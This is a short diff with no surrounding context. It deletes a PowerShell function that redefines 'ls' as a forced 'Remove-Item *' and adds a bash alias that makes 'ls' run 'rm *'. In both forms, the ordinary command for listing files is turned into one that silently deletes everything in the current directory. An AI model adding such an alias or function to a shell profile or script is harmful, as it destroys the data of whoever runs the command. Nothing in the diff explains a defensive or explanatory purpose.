@@ -1,3 +1,1 @@
-Function ls {
-    Remove-Item * -Force
-}
+alias ls='rm *'
